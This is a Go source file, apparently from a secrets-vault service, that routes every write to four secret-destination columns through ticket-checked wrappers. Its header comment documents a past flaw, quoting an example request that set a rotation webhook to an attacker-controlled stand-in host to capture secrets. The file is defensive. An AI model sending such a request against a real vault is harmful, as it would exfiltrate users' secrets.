package handlers

import (
	"context"
	"net/url"
	"strings"

	"github.com/bright-interaction/trustissues/internal/db"
	"github.com/bright-interaction/trustissues/internal/egressgate"
)

// THE ONLY FILE IN THIS PACKAGE THAT MAY WRITE A HOST-CHOOSING COLUMN.
//
// Four columns of vault_entries can move where a decrypted secret goes:
// destination_patterns, provider, provider_meta and rotation_targets. They are
// classified as egressChoosesHost in egress_field_coverage_test.go, and until
// round 5 that classification was the whole of the coverage: the table said
// rotation_targets chooses a host, and VaultHandler.UpdateTargets wrote it
// without asking anybody. A vault_only account holding an accepted EDITOR seat
// on somebody else's shared entry did
//
//	PUT /api/vault/{id}/targets
//	[{"type":"webhook","webhook_url":"https://attacker-controlled.example/collect"}]
//
// and the next scheduled rotation POSTed the freshly minted plaintext there.
//
// The lesson is not "we missed a column". It is that a per-handler check is a
// thing a handler can forget, and forgetting is invisible: the code that forgot
// looks exactly like code with nothing to check. So the check moved to where a
// write cannot happen without it.
//
// The rule this file enforces, mechanically:
//
//	Every generated query that writes destination_patterns, provider,
//	provider_meta or rotation_targets is called from THIS FILE and nowhere
//	else, through a wrapper that demands an egressgate.Ticket naming the same
//	entry and the same field.
//
// A Ticket comes only from egressgate.Decide, which consults
// mayDirectSecretEgress exactly when the write ADDS a destination. So a new
// route, or a new column, is covered on the day it is written: it either goes
// through a wrapper (and is gated) or it does not (and
// TestEveryHostChoosingWriteGoesThroughTheChokepoint fails, naming the query it
// called and the column that query writes).
//
// The set of guarded queries is not a list kept here. It is derived by the guard
// from the GENERATED SQL in internal/db, so a query added next year that writes
// one of these columns is guarded the moment sqlc emits it.

// The field names a Ticket is issued against. A Ticket for one of these cannot
// be spent on another, so a handler that has permission to narrow a ceiling
// cannot use that permission to write a delivery target.
const (
	egressFieldDestinations   = "destination_patterns"
	egressFieldProvider       = "provider+provider_meta"
	egressFieldProviderMeta   = "provider_meta"
	egressFieldRotationTarget = "rotation_targets"
)

// ── the destination derivers ────────────────────────────────────────────────
//
// One per host-choosing field. Each renders a stored or proposed value as the
// set of places the secret could end up, so egressgate.Decide can ask the only
// question that matters: does this write ADD one?

// ceilingDestinations renders a capability ceiling as its destination set. The
// patterns are kept whole, host AND path, because the ceiling grammar is what
// capability.patternMatch honours: moving api.example.com/v1/chat to
// api.example.com/v1/files is the same host and a different destination.
func ceilingDestinations(patterns []string) []string {
	out := make([]string, 0, len(patterns))
	for _, p := range patterns {
		if p = strings.TrimSpace(p); p != "" {
			out = append(out, p)
		}
	}
	return out
}

// providerDestinations renders a (provider, provider_meta) pair as the hosts its
// adapter may reach, straight out of the declaration table. Computed from the
// DECLARED set rather than the raw column text, so "site: datadoghq.eu" ->
// "site: evil.example" reads as adding api.evil.example rather than as an opaque
// string edit.
func providerDestinations(provider string, meta map[string]string) []string {
	allow := declaredProviderEgress(provider, meta)
	out := append([]string{}, allow.hosts...)
	for _, s := range allow.suffixes {
		out = append(out, "*"+strings.ToLower(s))
	}
	return out
}

// providerDestinationCovers is the subsumption rule for the provider host set.
// It mirrors the suffix handling inside authorityForEgressChange: backblaze is
// the one vendor that names its own second storage host at runtime, so carrying
// its declared "*.backblazeb2.com" forward must not read as a widening when an
// unchanged entry is re-saved. Nothing else declares a suffix, and the suffix
// values are compile-time constants, so this cannot launder a new host in.
func providerDestinationCovers(have, want string) bool {
	have = strings.ToLower(strings.TrimSpace(have))
	want = strings.ToLower(strings.TrimSpace(want))
	if have == "" || want == "" {
		return false
	}
	if have == want {
		return true
	}
	if suffix, ok := strings.CutPrefix(have, "*"); ok {
		return strings.HasSuffix(want, suffix) && len(want) > len(suffix)
	}
	return false
}

// deliveryDestinations renders rotation targets as their destination set.
//
// Only the types that actually carry the secret VALUE off the box count.
// "notify" fires a channel message and never includes the value, so adding one
// is not a redirect and stays open to anyone with manage. That is deliberate:
// the gate is about where plaintext goes, not about who may configure the
// rotation panel.
//
// The unit is rotationTargetIdentity, i.e. the whole destination including the
// path, not just the hostname. A webhook moved from /deploy to /collect on the
// same host is a different place for the secret to land, and the identity
// function already excludes the label and the HMAC secret so renaming a target
// or rotating its signing key is not treated as a redirect.
func deliveryDestinations(targets []RotationTarget) []string {
	out := make([]string, 0, len(targets))
	for _, t := range targets {
		if !targetTransmitsSecret(t) {
			continue
		}
		out = append(out, rotationTargetIdentity(t))
	}
	return out
}

// deliveryDestinationHosts renders target identities as hostnames, for the
// refusal an operator reads. A 403 that says "denied" without naming the host
// somebody just tried to add sends them to the logs to find out what they did.
func deliveryDestinationHosts(identities []string) []string {
	out := make([]string, 0, len(identities))
	for _, id := range identities {
		parts := strings.SplitN(id, "|", 3)
		if len(parts) < 2 {
			out = append(out, id)
			continue
		}
		raw := parts[1]
		// u.Host, not u.Hostname(): the port is part of where a delivery lands and
		// an operator reading the refusal wrote it themselves. Stripping it would
		// render two different destinations identically in the one message whose
		// job is to say which one was refused.
		if u, err := url.Parse(strings.TrimSpace(raw)); err == nil && u.Host != "" {
			out = append(out, u.Host)
			continue
		}
		out = append(out, raw)
	}
	return out
}

// ── the wrappers ────────────────────────────────────────────────────────────
//
// Each takes the querier (the pool, or a caller's qtx, because a helper called
// between BeginTx and Commit must not reach for the pool) plus a Ticket. The
// Ticket check is first in every one of them: a wrapper that performed the
// write and then complained would have already moved the secret.

// setEntryDestinationPatterns writes the capability ceiling.
func setEntryDestinationPatterns(ctx context.Context, q *db.Queries, tk egressgate.Ticket,
	p db.UpdateVaultEntryDestinationPatternsParams) error {

	if err := tk.Authorizes(p.ID, egressFieldDestinations); err != nil {
		return err
	}
	return q.UpdateVaultEntryDestinationPatterns(ctx, p)
}

// seedEntryCapabilityDefaults writes the provider preset into the ceiling. It
// is a ceiling write like any other: it turns "no agent access" into "one host",
// and three presets expand a tenant value out of the entry's own provider_meta.
func seedEntryCapabilityDefaults(ctx context.Context, q *db.Queries, tk egressgate.Ticket,
	p db.SeedVaultEntryCapabilityDefaultsParams) error {

	if err := tk.Authorizes(p.ID, egressFieldDestinations); err != nil {
		return err
	}
	return q.SeedVaultEntryCapabilityDefaults(ctx, p)
}

// setEntryProvider writes provider, provider_meta and auto_rotate together.
func setEntryProvider(ctx context.Context, q *db.Queries, tk egressgate.Ticket,
	p db.UpdateVaultEntryProviderParams) error {

	if err := tk.Authorizes(p.ID, egressFieldProvider); err != nil {
		return err
	}
	return q.UpdateVaultEntryProvider(ctx, p)
}

// setEntryProviderMeta writes provider_meta alone. Two callers, both of them the
// server recording its own work (the rotation write-back of a minted key id, and
// the at-rest encryption backfill), and neither may change the reachable hosts.
func setEntryProviderMeta(ctx context.Context, q *db.Queries, tk egressgate.Ticket,
	p db.UpdateVaultEntryProviderMetaParams) error {

	if err := tk.Authorizes(p.ID, egressFieldProviderMeta); err != nil {
		return err
	}
	return q.UpdateVaultEntryProviderMeta(ctx, p)
}

// setEntryRotationTargets writes the delivery targets. THE round-5 column.
func setEntryRotationTargets(ctx context.Context, q *db.Queries, tk egressgate.Ticket,
	p db.UpdateVaultEntryRotationTargetsParams) error {

	if err := tk.Authorizes(p.ID, egressFieldRotationTarget); err != nil {
		return err
	}
	return q.UpdateVaultEntryRotationTargets(ctx, p)
}

// createEntryRow inserts a vault entry, which carries provider and
// provider_meta on the INSERT.
//
// The authority is not in question here and the Ticket says so explicitly
// rather than by omission: the row being created carries the caller's own
// user_id, so they ARE the principal mayDirectSecretEgress would name. Making
// this call a wrapper anyway is the point of a chokepoint. The alternative is
// one query exempted "because it is obviously fine", which is how the next
// reviewer discovers a second door.
func createEntryRow(ctx context.Context, q *db.Queries, tk egressgate.Ticket,
	p db.CreateVaultEntryParams) error {

	if err := tk.Authorizes(p.ID, egressFieldProvider); err != nil {
		return err
	}
	return q.CreateVaultEntry(ctx, p)
}

// ── the decisions ───────────────────────────────────────────────────────────

// decideDeliveryEgress answers whether userID may store `next` as this entry's
// delivery targets, given what is currently stored.
//
// Same authority as destination_patterns, deliberately: adding a delivery target
// IS adding a destination. deliverToWebhook POSTs {"new_value": <the secret>} to
// a URL somebody named, which is the same act as pointing the capability proxy
// at a host somebody named, and until round 5 the two were held to different
// rights on the same entry.
//
// See DEFERRED (i) for what this replaces and which four guards changed premise.
func (h *VaultHandler) decideDeliveryEgress(ctx context.Context, userID string, isAdmin bool,
	entryID string, stored, next []RotationTarget) (egressgate.Ticket, error) {

	return egressgate.Decide(egressgate.Request{
		EntryID: entryID,
		What:    egressFieldRotationTarget,
		Before:  deliveryDestinations(stored),
		After:   deliveryDestinations(next),
		MayRedirect: func() bool {
			return h.mayDirectSecretEgress(ctx, userID, isAdmin, entryID)
		},
	})
}
